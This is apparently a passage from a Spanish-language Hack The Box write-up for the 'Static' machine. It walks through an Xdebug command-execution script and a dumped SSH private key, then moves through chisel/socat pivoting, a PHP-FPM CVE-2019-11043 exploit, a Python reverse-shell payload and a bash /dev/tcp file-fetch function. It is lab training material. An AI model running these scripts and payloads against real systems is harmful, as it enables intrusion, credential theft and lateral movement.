<init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///var/www/html/info.php" language="PHP" xdebug:language_version="7.2.1-1ubuntu2" protocol_version="1.0" appid="41" idekey="1234567890"><engine version="2.6.0"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick Rethans]]></author><url><![CDATA[http://xdebug.org]]></url><copyright><![CDATA[Copyright (c) 2002-2018 by Derick Rethans]]></copyright></init>
>> 
```

Recibo la conexión, pero como tuve problemas para enviarme la reverse shell, retoco el script para parshear el output

Me intersa quedarme con la cadena en base64

```null
python2 exploit_shell.py
> /home/rubbx/Desktop/HTB/Machines/Static/exploit_shell.py(24)<module>()
-> print(client_data)
(Pdb) p client_data
'495\x00<?xml version="1.0" encoding="iso-8859-1"?>\n<init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///var/www/html/info.php" language="PHP" xdebug:language_version="7.2.1-1ubuntu2" protocol_version="1.0" appid="43" idekey="1234567890"><engine version="2.6.0"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick Rethans]]></author><url><![CDATA[http://xdebug.org]]></url><copyright><![CDATA[Copyright (c) 2002-2018 by Derick Rethans]]></copyright></init>\x00'
(Pdb) l
 19  	while  True: 
 20  	   client_data = conn.recv(1024)
 21  	   
 22  	   pdb.set_trace()
 23  	
 24  ->	   print(client_data) 
 25  	
 26  	   data = raw_input ('>> ') 
 27  	   conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
[EOF]
>> system("whoami")
> /home/rubbx/Desktop/HTB/Machines/Static/exploit_shell.py(22)<module>()
-> pdb.set_trace()
(Pdb) p client_data
'263\x00<?xml version="1.0" encoding="iso-8859-1"?>\n<response xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" command="eval" transaction_id="1"><property type="string" size="8" encoding="base64"><![CDATA[d3d3LWRhdGE=]]></property></response>\x00'
(Pdb) base64.b64decode(re.findall(r'CDATA\[(.*?)\]', client_data)[0])
'www-data'
```

Quedaría así:

```null
#!/usr/bin/env python2

import socket, sys, signal, re, base64

def def_handler(sig, frame):
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)


# Variables globales
ip_port = ('0.0.0.0', 9000) 
sk = socket.socket()
sk.bind(ip_port) 
sk.listen(10) 
conn, addr = sk.accept() 

while  True: 
    client_data = conn.recv(1024)

    response_64 = re.findall(r'CDATA\[(.*?)\]', client_data)[0]

    try:
        print(base64.b64decode(response_64))

    except:
        None
    
    data = "system(\"" + raw_input ('>> ') + "\")" 
    conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))
```

```null
python2 exploit_shell.py
>> whoami
www-data
```

Tiene asignada otra interfaz

```null
>> hostname -I
172.20.0.10 192.168.254.2
```

Tiene un directorio ```.ssh```

```null
>> ls -la /home/www-data/
drwx------ 2 www-data www-data 4096 Jun 14  2021 .ssh
```

Y una clave privada

```null
>> ls -la /home/www-data/.ssh/ | awk 'NR==4'
-rw-r--r-- 1 www-data www-data  390 Jun 14  2021 authorized_keys
>> ls -la /home/www-data/.ssh/ | awk 'NR==5'
-rw------- 1 www-data www-data 1675 Jun 14  2021 id_rsa
>> ls -la /home/www-data/.ssh/ | awk 'NR==6'
-rw-r--r-- 1 www-data www-data  390 Jun 14  2021 id_rsa.pub
```

```null
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==1'
-----BEGIN RSA PRIVATE KEY-----
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==2'
MIIEowIBAAKCAQEA0pNa5qwGZ+DKsS60GPhNfCqZti7z1xPzxOTXwtwO9uYzZpq/
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==3'
nrhzgJq0nQNVRUbaiZ+H6gR1OreDyjr9YorV2kJqccscBPZ59RAhttaQsBqHkGjJ
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==4'
QEHYKteL1D+hJ80NDd7fJTtQgzT4yBDwrVKwIUSETMfWgzJ5z24LN5s/rcQYgl3i
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==5'
VKmls3lsod8ilakdDoYEYt12L4ST/exEoVl0AyD9y8m651q40k1Gz4WzPnaHAlnj
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==6'
mL6CANfiNAJoc8WnqZN5ruSrWhmivmDbKLlDCO5bCCzi2zMHJKqQkcBxdWk60Qhi
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==7'
17UJMV3mKVQRprvpeTR2jCMykH81n2KU46doSQIDAQABAoIBAADCHxWtkOhW2uQA
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==8'
cw2T91N3I86QJLiljb8rw8sj17nz4kOAUyhTKbdQ102pcWkqdCcCuA6TrYhkmMjl
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==9'
pXvxXAvJKXD3dkZeTNohEL4Dz8mSjuJqPi9JDWo6FHrTL9Vg26ctIkiUChou2qZ9
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==10'
ySAWqCO2h3NvVMpsKBwjHU858+TASlo4j03FJOdmROmUelcqmRimWxgneHBAHEZj
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==11'
GqDuPjmPmw7pbThqlETyosrbaB3rROzUp9CKAHzYB1BvOTImDsb6qQ+GdKwewAQf
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==12'
j60myPuxl4qgY8O2yqLFUH3/ovtPTKqHJSUFBO23wzS1qPLupzu1GVXwlsdlhRWA
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==13'
Amvx+AECgYEA6OOd9dgqXR/vBaxDngWB6ToVysWDjO+QsjO4OpFo7AvGhMRR+WpK
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==14'
qbZyJG1iQB0nlAHgYHEFj4It9iI6NCdTkKyg2UzZJMKJgErfgI0Svkh/Kdls23Ny
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==15'
gxpacxW3d2RlyAv4m2hG4n82+DsoPcN+6KxqGRQxWywXtsBsYkRb+wkCgYEA53jg
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==16'
+1CfGEH/N2TptK2CCUGB28X1eL0wDs83RsU7Nbz2ASVQj8K0MlVzR9CRCY5y6jcq
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==17'
te1YYDiuFvT+17ENSe5fDtNiF1LEDfp45K6s4YU79DMp6Ot84c2fBDIh8ogH0D7C
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==18'
CFdjXCI3SIlvc8miyivjRHoyJYJz/cO94DsTE0ECgYA1HlWVEWz4OKRoAtaZYGA1
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==19'
Ng5qZYqPxsSWIL3QfgIUdMse1ThtTxUgiICYVmqmfP/d/l+TH7RI+0RIc54a7y1c
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==20'
PkOhzKlqfQSnwmwgAg1YYWi/vtvZYgeoZ4Zh4X4rOTcN3c0ihTJFzwZWsAeJruFv
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==21'
aIP6nGR1iyUNhe4yq6zfIQKBgANYQNAA2zurgHeZcrMUqsNdefXmB2UGPtKH9gGE
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==22'
yhU9tMRReLeLFbWAfJj2D5J2x3xQ7cIROuyxBPr58VDGky2VTzRUo584p/KXwvVy
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==23'
/LaJiVM/BgUCmhxdL0YNP2ZUxuAgeAdM0/e52time8DNkhefyLntlhnqp6hsEqtR
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==24'
zzXBAoGBANB6Wdk/X3riJ50Bia9Ai7/rdXUpAa2B4pXARnP1/tw7krfPM/SCMABe
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==25'
sjZU9eeOecWbg+B6RWQTNcxo/cRjMpxd5hRaANYhcFXGuxcg1N3nszhWDpHIpGr+
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==26'
s5Mwc3oopgv6gMmetHMr0mcGz6OR9KsH8FvW1y+DYY3tUdgx0gau
>> cat /home/www-data/.ssh/id_rsa | awk 'NR==27'
-----END RSA PRIVATE KEY-----
```

Gano acceso al contenedor

```null
ssh -i id_rsa www-data@172.20.0.10
The authenticity of host '172.20.0.10 (172.20.0.10)' can't be established.
ED25519 key fingerprint is SHA256:hki6VXu+ef1RkYZkYFiyIaNgPd6e7boZm9pH7yJDQUI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.20.0.10' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.19.0-17-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Jun 14 08:00:30 2021 from 10.10.14.4
www-data@web:~$ 
```

Puedo ver la primera flag

```null
www-data@web:/home$ cat user.txt 
604b3ac5b353396e982a2fbf61c5cef2
```

# Escalada

Subo el ```chisel``` para poder tener conectividad con la ```192.168.254.3```

En mi equipo lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

Desde el contenedor como cliente

```null
www-data@web:/tmp$ ./chisel client 10.10.16.11:1234 R:socks &>/dev/null & disown
```

Subo un binario estático de ```nmap``` y detecta que tiene el puerto 80 abierto

```null
www-data@web:/tmp$ ./nmap -p- --open --min-rate 5000 -n -Pn 192.168.254.3

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-17 11:48 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.254.3
Host is up (0.00018s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.35 seconds
```

Hay otras IPs activas

```null
www-data@web:/tmp$ ./nmap -p- --min-rate 5000 -sn 192.168.254.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-17 11:50 UTC
You cannot use -F (fast scan) or -p (explicit port selection) when not doing a port scan
QUITTING!
www-data@web:/tmp$ ./nmap --min-rate 5000 -sn 192.168.254.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-17 11:50 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.254.1
Host is up (0.00056s latency).
Nmap scan report for web (192.168.254.2)
Host is up (0.00030s latency).
Nmap scan report for pki.secret (192.168.254.3)
Host is up (0.00024s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 13.31 seconds
```

```null
www-data@web:/tmp$ ./nmap -p- --open --min-rate 5000 -n -Pn 192.168.254.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-17 11:50 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.254.2
Host is up (0.000087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```null
www-data@web:/tmp$ ./nmap -p- --open --min-rate 5000 -n -Pn 192.168.254.3

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-17 11:51 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.254.3
Host is up (0.00013s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds
```

La página web tiene lo siguiente:

```null
proxychains curl -s -X GET 192.168.254.3
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
batch mode: /usr/bin/ersatool create|print|revoke CN
```

Listo las cabeceras de respuesta

```null
proxychains curl -s -X GET 192.168.254.3 -I
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 17 Mar 2023 11:57:45 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP-FPM/7.1
```

La versión PHP-FMP/7.1 es vulnerable. Encuntré este exploit en [Github](https://github.com/theMiddleBlue/CVE-2019-11043)

```nulll
proxychains python3 exploit.py --url http://192.168.254.3/index.php
[*] QSL candidate: 1754, 1759, 1764
[*] Target seems vulnerable (QSL:1754/HVL:220): PHPSESSID=5075a19f2a53ceec47086d501e4fe145; path=/
[*] RCE successfully exploited!

    You should be able to run commands using:
    curl http://192.168.254.3/index.php?a=bin/ls+/
```

Creo un tunel con ```socat``` para poder recibir la reverse shell en mi equipo

```null
www-data@web:/tmp$ ./socat TCP-LISTEN:1111,fork TCP:172.30.0.9:443
```

Envío el payload

```null
import requests
 
payload = '/usr/bin/python3 -c \'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
r = requests.get("http://192.168.254.3/index.php?a="+payload)
print(r.text)
```

```null
python3 test.py
```

Recibo la reverse shell

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [172.30.0.9] from (UNKNOWN) [172.30.0.1] 50978
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@pki:~/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@pki:~/html$ export TERM=xterm
www-data@pki:~/html$ export SHELL=bash
www-data@pki:~/html$ stty rows 55 columns 209
```

Veo el ```index.php```

```null
www-data@pki:~/html$ cat index.php 
<?php
header('X-Powered-By: PHP-FPM/7.1');
//cn needs to be parsed!!!
$cn=preg_replace("/[^A-Za-z0-9 ]/", '',$_GET['cn']);
echo passthru("/usr/bin/ersatool create ".$cn);
?>
```

Este tiene una capability asignada

```null
www-data@pki:~/html$ getcap /usr/bin/ersatool
/usr/bin/ersatool = cap_setuid+eip
```

Puedo llegar a cambiar mi UID para convertirme en root, en caso de que logre inyectar un comando. Me transfiero el ```pspy``` a la máquina. Como no tengo conectividad, creo un tunel por ```socat```

```null
www-data@web:/tmp$ ./socat TCP-LISTEN:1112,fork TCP:172.30.0.9:81
```

Al no tener ```curl```, utilizo una función de bash

```null
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```



